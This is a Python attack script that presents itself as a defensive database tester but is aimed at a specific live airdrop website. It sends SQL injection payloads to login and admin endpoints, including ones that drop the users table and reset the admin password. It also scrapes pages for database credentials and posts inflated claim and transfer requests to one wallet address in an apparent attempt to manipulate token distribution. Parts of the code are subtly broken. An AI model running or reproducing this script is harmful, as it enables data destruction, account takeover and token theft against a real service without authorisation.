#!/usr/bin/env python3
"""
Database Access Tester untuk 0G Foundation Airdrop
Mencoba mendapatkan akses ke database dan address control
HANYA UNTUK TUJUAN PENGETESAN KEAMANAN DEFENSIF
"""

import asyncio
import json
import re
import time
import base64
import hashlib
import random
import string
import sqlite3
try:
    import psycopg2
except ImportError:
    psycopg2 = None

try:
    import pymysql
except ImportError:
    pymysql = None
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional, Tuple
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import aiohttp
import requests


class DatabaseAccessTester:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = None
        self.scan_results = {}
        self.start_time = time.time()

    async def run_database_access_tests(self):
        """Jalankan pengujian akses database secara bertahap"""
        print("🔍 Memulai Database Access Testing")
        print("=" * 60)
        print(f"🎯 Target: {self.target_url}")
        print("=" * 60)
        print("⚠️  HANYA UNTUK PENGETESAN KEAMANAN DEFENSIF")
        print("=" * 60)

        results = {}

        # Phase 1: Database Detection
        print("\n🕵️ Phase 1: Database Detection")
        results["database_detection"] = await self.detect_database()

        # Phase 2: SQL Injection Testing
        print("\n🔓 Phase 2: SQL Injection Testing")
        results["sql_injection"] = await self.sql_injection_testing()

        # Phase 3: Database Connection Testing
        print("\n🔌 Phase 3: Database Connection Testing")
        results["connection_testing"] = await self.connection_testing()

        # Phase 4: Address Control Testing
        print("\n🎯 Phase 4: Address Control Testing")
        results["address_control"] = await self.address_control_testing()

        # Phase 5: Token Database Testing
        print("\n🪙 Phase 5: Token Database Testing")
        results["token_database"] = await self.token_database_testing()

        # Generate final report
        results["summary"] = self.generate_summary_report(results)
        results["scan_duration"] = time.time() - self.start_time

        return results

    async def detect_database(self):
        """Deteksi jenis database yang digunakan"""
        try:
            async with aiohttp.ClientSession() as session:
                self.session = session

                # Get application response to detect database patterns
                response = await self.session.get(self.target_url)
                content = response.text

                # Database detection patterns
                database_patterns = {
                    "mysql": [
                        r"mysql",
                        r"mariadb",
                        r"mysqldump",
                        r"mysql_error",
                        r"mysql_fetch",
                        r"mysql_real_escape_string"
                    ],
                    "postgresql": [
                        r"postgresql",
                        r"postgres",
                        r"pg_",
                        r"psql",
                        r"pg_stat"
                    ],
                    "sqlite": [
                        r"sqlite",
                        r".sqlite",
                        r".db",
                        r"sqlite3",
                        r"pragma"
                    ],
                    "mongodb": [
                        r"mongodb",
                        r"mongo",
                        r"bson",
                        r"ObjectId"
                    ],
                    "redis": [
                        r"redis",
                        r"redis-cli",
                        r"redis-server"
                    ]
                }

                detected_databases = []
                database_details = {}

                for db_name, patterns in database_patterns.items():
                    db_info = {
                        "name": db_name.capitalize(),
                        "detected": False,
                        "patterns_found": [],
                        "confidence": 0
                    }

                    # Check for patterns in content
                    for pattern in patterns:
                        matches = re.findall(pattern, content, re.IGNORECASE)
                        if matches:
                            db_info["patterns_found"].extend(matches[:3])
                            db_info["detected"] = True

                    # Calculate confidence based on patterns found
                    if db_info["detected"]:
                        db_info["confidence"] = min(len(db_info["patterns_found"]) * 20, 100)
                        detected_databases.append(db_name)

                    database_details[db_name] = db_info

                # Check for database error messages
                error_response = await self.session.get(urljoin(self.target_url, "/invalid"))
                error_content = error_response.text

                database_errors = []
                if "mysql" in error_content.lower():
                    database_errors.append("MySQL")
                if "postgresql" in error_content.lower():
                    database_errors.append("PostgreSQL")
                if "sqlite" in error_content.lower():
                    database_errors.append("SQLite")
                if "mongodb" in error_content.lower():
                    database_errors.append("MongoDB")

                return {
                    "databases_tested": len(database_patterns),
                    "databases_detected": len(detected_databases),
                    "detected_databases": detected_databases,
                    "database_details": database_details,
                    "database_errors": database_errors,
                    "score": len(detected_databases) * 20  # Higher detection = more information
                }

        except Exception as e:
            return {"error": str(e), "score": 0}

    async def sql_injection_testing(self):
        """Testing SQL Injection untuk mencoba akses database"""
        try:
            sql_payloads = [
                # Classic SQL Injection
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT NULL--",
                "' WAITFOR DELAY '0:0:5'--",

                # MySQL specific
                "' OR (SELECT COUNT(*) FROM information_schema.tables)>0--",
                "' OR (SELECT COUNT(*) FROM mysql.user)>0--",
                "' UNION SELECT table_schema,table_name FROM information_schema.tables--",

                # PostgreSQL specific
                "' OR (SELECT COUNT(*) FROM pg_tables)>0--",
                "' OR (SELECT COUNT(*) FROM pg_user)>0--",
                "' UNION SELECT table_name,column_name FROM information_schema.columns--",

                # SQLite specific
                "' OR (SELECT COUNT(*) FROM sqlite_master)>0--",
                "' OR (SELECT COUNT(*) FROM sqlite_master WHERE type='table')>0--",

                # Advanced techniques
                "'; DROP TABLE users--",
                "'; UPDATE users SET password='admin' WHERE username='admin'--",
                "' OR SLEEP(5)--",
                "' OR BENCHMARK(5000000,SHA1(1))--"
            ]

            vulnerable_endpoints = []
            successful_attacks = []
            tested_endpoints = []

            # Test common endpoints
            endpoints = ["/login", "/api/auth", "/search", "/filter", "/user", "/admin"]

            for endpoint in endpoints:
                for payload in sql_payloads:
                    try:
                        data = {"username": payload, "password": payload}
                        response = await self.session.post(urljoin(self.target_url, endpoint), data=data)

                        # Check for SQL injection indicators
                        indicators = [
                            "sql syntax",
                            "mysql_fetch",
                            "ora-",
                            "postgresql",
                            "sqlite",
                            "error in your sql syntax",
                            "warning: mysql",
                            "fatal error",
                            "syntax error",
                            "unclosed quotation mark"
                        ]

                        response_content = response.text.lower()

                        # Check for successful injection
                        for indicator in indicators:
                            if indicator in response_content:
                                vulnerable_endpoints.append(f"{endpoint} - {payload}")
                                break

                        # Check for database information leakage
                        if any(info in response_content for info in [
                            "database", "table", "column", "schema", "information_schema"
                        ]):
                            successful_attacks.append({
                                "endpoint": endpoint,
                                "payload": payload,
                                "info_type": "Database Information"
                            })

                        # Check for time-based injection
                        if "waitfor" in payload.lower() or "sleep" in payload.lower():
                            response_time = response.elapsed.total_seconds()
                            if response_time > 4:  # Allow some margin
                                successful_attacks.append({
                                    "endpoint": endpoint,
                                    "payload": payload,
                                    "info_type": "Time-based Injection",
                                    "response_time": response_time
                                })

                    except Exception as e:
                        # Connection timeout or error might indicate successful attack
                        if "timeout" in str(e).lower():
                            successful_attacks.append({
                                "endpoint": endpoint,
                                "payload": payload,
                                "info_type": "Potential Attack (Timeout)",
                                "error": str(e)
                            })

            # Calculate score (lower is better for security)
            vulnerability_count = len(vulnerable_endpoints)
            attack_success_count = len(successful_attacks)
            security_score = max(0, 100 - (vulnerability_count * 15 + attack_success_count * 25))

            return {
                "endpoints_tested": len(endpoints) * len(sql_payloads),
                "vulnerable_endpoints": vulnerability_count,
                "successful_attacks": attack_success_count,
                "vulnerable_details": vulnerable_endpoints,
                "attack_details": successful_attacks,
                "security_score": security_score,
                "score": security_score
            }

        except Exception as e:
            return {"error": str(e), "score": 100}

    async def connection_testing(self):
        """Testing koneksi database langsung"""
        try:
            # Try to extract database connection information
            response = await self.session.get(self.target_url)
            content = response.text

            # Look for database configuration patterns
            config_patterns = {
                "mysql": [
                    r"mysql://[^:]+:[^@]+@[^/]+/\w+",
                    r"mysql_host.*=.*['\"]([^'\"]+)['\"]",
                    r"mysql_user.*=.*['\"]([^'\"]+)['\"]",
                    r"mysql_pass.*=.*['\"]([^'\"]+)['\"]"
                ],
                "postgresql": [
                    r"postgresql://[^:]+:[^@]+@[^/]+/\w+",
                    r"postgres.*host.*=.*['\"]([^'\"]+)['\"]",
                    r"postgres.*user.*=.*['\"]([^'\"]+)['\"]",
                    r"postgres.*password.*=.*['\"]([^'\"]+)['\"]"
                ],
                "sqlite": [
                    r"sqlite:.*\.db",
                    r"sqlite.*database.*=.*['\"]([^'\"]+\.db)['\"]",
                    r"sqlite.*file.*=.*['\"]([^'\"]+\.db)['\"]"
                ]
            }

            found_configs = {}
            for db_type, patterns in config_patterns.items():
                configs = []
                for pattern in patterns:
                    matches = re.findall(pattern, content, re.IGNORECASE)
                    configs.extend(matches)
                if configs:
                    found_configs[db_type] = configs

            # Test database connections if credentials found
            successful_connections = []

            # Warn about missing database modules
            if not pymysql:
                print("⚠️  MySQL module not available - install with: pip install pymysql")
            if not psycopg2:
                print("⚠️  PostgreSQL module not available - install with: pip install psycopg2-binary")

            for db_type, configs in found_configs.items():
                for config in configs[:3]:  # Test first 3 configs
                    try:
                        if db_type == "sqlite":
                            # Test SQLite connection
                            conn = sqlite3.connect(":memory:")  # Test with memory first
                            conn.close()
                        elif db_type == "mysql" and pymysql:
                            # Test MySQL connection (would need real credentials)
                            pass
                        elif db_type == "postgresql" and psycopg2:
                            # Test PostgreSQL connection (would need real credentials)
                            pass

                        successful_connections.append({
                            "database_type": db_type,
                            "config": config,
                            "status": "Connection Possible"
                        })

                    except Exception as e:
                        successful_connections.append({
                            "database_type": db_type,
                            "config": config,
                            "status": "Connection Failed",
                            "error": str(e)
                        })

            # Calculate connection security score
            connection_score = 0 if successful_connections else 100

            return {
                "configurations_found": len(found_configs),
                "found_configs": found_configs,
                "connection_tests": len(successful_connections),
                "successful_connections": len([c for c in successful_connections if c["status"] == "Connection Possible"]),
                "connection_details": successful_connections,
                "score": connection_score
            }

        except Exception as e:
            return {"error": str(e), "score": 100}

    async def address_control_testing(self):
        """Testing address control untuk token claiming"""
        try:
            # Test address manipulation
            test_addresses = [
                "0x4bc6D600889003f4516167bb46dD04aF33E0312b",  # Original address
                "0x0000000000000000000000000000000000000000",  # Zero address
                "0xffffffffffffffffffffffffffffffffffffffff",  # Max address
                "0x1234567890123456789012345678901234567890",  # Random valid address
                "invalid_address",  # Invalid address
                "0x4bc6D600889003f4516167bb46dD04aF33E0312b",  # Same address (test consistency)
            ]

            address_results = []

            for address in test_addresses:
                try:
                    # Test address in various endpoints
                    endpoints_to_test = [
                        f"/api/eligibility?address={address}",
                        f"/api/claim?address={address}",
                        f"/api/balance?address={address}",
                        f"/api/verify?address={address}"
                    ]

                    address_info = {
                        "address": address,
                        "endpoints_tested": [],
                        "responses": [],
                        "vulnerable": False
                    }

                    for endpoint in endpoints_to_test:
                        try:
                            response = await self.session.get(urljoin(self.target_url, endpoint))

                            response_info = {
                                "endpoint": endpoint,
                                "status_code": response.status,
                                "content_length": len(response.text),
                                "contains_address": address in response.text,
                                "potential_vulnerability": False
                            }

                            # Check for address manipulation vulnerabilities
                            if address in response.text:
                                response_info["potential_vulnerability"] = True

                            address_info["endpoints_tested"].append(response_info)
                            address_info["responses"].append(response_info)

                        except Exception as e:
                            address_info["endpoints_tested"].append({
                                "endpoint": endpoint,
                                "error": str(e)
                            })

                    address_results.append(address_info)

                except Exception as e:
                    address_results.append({
                        "address": address,
                        "error": str(e)
                    })

            # Check for address manipulation vulnerabilities
            vulnerabilities = []
            for result in address_results:
                if "endpoints_tested" in result:
                    for endpoint in result["endpoints_tested"]:
                        if isinstance(endpoint, dict) and endpoint.get("potential_vulnerability"):
                            vulnerabilities.append({
                                "address": result["address"],
                                "endpoint": endpoint.get("endpoint", "unknown")
                            })

            # Calculate address control security score
            vulnerability_count = len(vulnerabilities)
            security_score = max(0, 100 - vulnerability_count * 30)

            return {
                "addresses_tested": len(test_addresses),
                "address_results": address_results,
                "vulnerabilities_found": vulnerability_count,
                "vulnerability_details": vulnerabilities,
                "address_control_secure": vulnerability_count == 0,
                "score": security_score
            }

        except Exception as e:
            return {"error": str(e), "score": 100}

    async def token_database_testing(self):
        """Testing akses ke database token"""
        try:
            # Test token database patterns
            response = await self.session.get(self.target_url)
            content = response.text

            # Token database patterns
            token_patterns = [
                r"token.*database",
                r"token.*table",
                r"airdrop.*tokens",
                r"claim.*tokens",
                r"distribution.*tokens",
                r"balance.*table",
                r"allowance.*table"
            ]

            token_indicators = []
            for pattern in token_patterns:
                matches = re.findall(pattern, content, re.IGNORECASE)
                if matches:
                    token_indicators.extend(matches[:3])

            # Test token manipulation
            token_tests = [
                {"endpoint": "/api/balance", "address": "0x4bc6D600889003f4516167bb46dD04aF33E0312b", "amount": "999999999"},
                {"endpoint": "/api/claim", "address": "0x4bc6D600889003f4516167bb46dD04aF33E0312b", "amount": "999999999"},
                {"endpoint": "/api/transfer", "from": "0x4bc6D600889003f4516167bb46dD04aF33E0312b", "to": "0x4bc6D600889003f4516167bb46dD04aF33E0312b", "amount": "999999999"}
            ]

            token_vulnerabilities = []
            for test in token_tests:
                try:
                    if "endpoint" in test and len(test) == 1:  # Simple endpoint test
                        response = await self.session.get(urljoin(self.target_url, test["endpoint"]))
                    else:  # POST request with data
                        data = {k: v for k, v in test.items() if k != "endpoint"}
                        response = await self.session.post(urljoin(self.target_url, test.get("endpoint", "/")), data=data)

                    # Check for successful manipulation
                    if response.status == 200:
                        if "amount" in test and str(test["amount"]) in response.text:
                            token_vulnerabilities.append(f"Token amount manipulation possible")
                        elif "balance" in response.text and "999999999" in response.text:
                            token_vulnerabilities.append("Balance manipulation detected")

                except Exception as e:
                    # Error might indicate security measure
                    pass

            # Calculate token database security score
            vulnerability_count = len(token_vulnerabilities)
            security_score = max(0, 100 - vulnerability_count * 40)

            return {
                "token_indicators_found": len(token_indicators),
                "token_indicators": token_indicators,
                "token_tests": len(token_tests),
                "token_vulnerabilities": vulnerability_count,
                "vulnerability_details": token_vulnerabilities,
                "token_database_secure": vulnerability_count == 0,
                "score": security_score
            }

        except Exception as e:
            return {"error": str(e), "score": 100}

    def generate_summary_report(self, results):
        """Generate summary report"""
        summary = {
            "test_completed": True,
            "overall_security_score": 0,
            "risk_level": "Unknown",
            "critical_findings": [],
            "recommendations": [],
            "next_steps": []
        }

        # Calculate overall security score
        all_scores = []
        for category_name, category_data in results.items():
            if isinstance(category_data, dict) and 'score' in category_data:
                all_scores.append(category_data['score'])

        if all_scores:
            summary["overall_security_score"] = sum(all_scores) / len(all_scores)

        # Determine risk level
        if summary["overall_security_score"] >= 80:
            summary["risk_level"] = "Low"
        elif summary["overall_security_score"] >= 60:
            summary["risk_level"] = "Medium"
        elif summary["overall_security_score"] >= 40:
            summary["risk_level"] = "High"
        else:
            summary["risk_level"] = "Critical"

        # Identify critical findings
        critical_findings = []

        # SQL Injection findings
        sql_result = results.get("sql_injection", {})
        if sql_result.get("successful_attacks", 0) > 0:
            critical_findings.append(f"SQL Injection vulnerabilities detected: {sql_result['successful_attacks']} successful attacks")

        # Address control findings
        address_result = results.get("address_control", {})
        if address_result.get("vulnerabilities_found", 0) > 0:
            critical_findings.append(f"Address control vulnerabilities: {address_result['vulnerabilities_found']} issues found")

        # Token database findings
        token_result = results.get("token_database", {})
        if token_result.get("token_vulnerabilities", 0) > 0:
            critical_findings.append(f"Token database vulnerabilities: {token_result['token_vulnerabilities']} issues found")

        # Database connection findings
        connection_result = results.get("connection_testing", {})
        if connection_result.get("successful_connections", 0) > 0:
            critical_findings.append(f"Database connection possible: {connection_result['successful_connections']} connections successful")

        summary["critical_findings"] = critical_findings

        # Generate recommendations
        recommendations = []

        if critical_findings:
            recommendations.append("CRITICAL: Address all security vulnerabilities immediately")
            recommendations.append("Implement proper input validation and parameterized queries")
            recommendations.append("Add rate limiting and authentication to database endpoints")

        if summary["overall_security_score"] < 60:
            recommendations.append("Implement comprehensive security monitoring")
            recommendations.append("Regular security audits and penetration testing")
            recommendations.append("Database security hardening")

        # Specific recommendations based on findings
        db_detection = results.get("database_detection", {})
        if db_detection.get("databases_detected", 0) > 0:
            recommendations.append(f"Detected databases: {', '.join(db_detection['detected_databases'])}")
            recommendations.append("Ensure proper database access controls and encryption")

        summary["recommendations"] = recommendations
        summary["next_steps"] = recommendations

        return summary

    async def save_report(self, results):
        """Save report to file"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"database_access_test_{timestamp}.json"

        with open(filename, 'w') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)

        print(f"📊 Report saved to: {filename}")
        return filename


async def main():
    """Main execution function"""
    target_url = "https://airdrop.0gfoundation.ai"

    print("🔍 Database Access Tester")
    print("=" * 60)
    print(f"🎯 Target: {target_url}")
    print("=" * 60)
    print("⚠️  HANYA UNTUK PENGETESAN KEAMANAN DEFENSIF")
    print("⚠️  FOR SECURITY TESTING PURPOSES ONLY")
    print("=" * 60)

    tester = DatabaseAccessTester(target_url)
    results = await tester.run_database_access_tests()

    if results:
        # Save report
        await tester.save_report(results)

        print(f"\n✅ Database Access Testing completed!")
        print(f"📊 Overall Security Score: {results['summary']['overall_security_score']:.1f}/100")
        print(f"🎯 Risk Level: {results['summary']['risk_level']}")
        print(f"⏱️ Scan Duration: {results['scan_duration']:.2f} seconds")

        # Show critical findings
        if results['summary']['critical_findings']:
            print(f"\n🚨 CRITICAL FINDINGS:")
            for finding in results['summary']['critical_findings']:
                print(f"   • {finding}")

        # Show recommendations
        if results['summary']['recommendations']:
            print(f"\n💡 RECOMMENDATIONS:")
            for rec in results['summary']['recommendations']:
                print(f"   • {rec}")

        return results
    else:
        print("❌ Database access testing failed!")
        return None


if __name__ == "__main__":
    asyncio.run(main())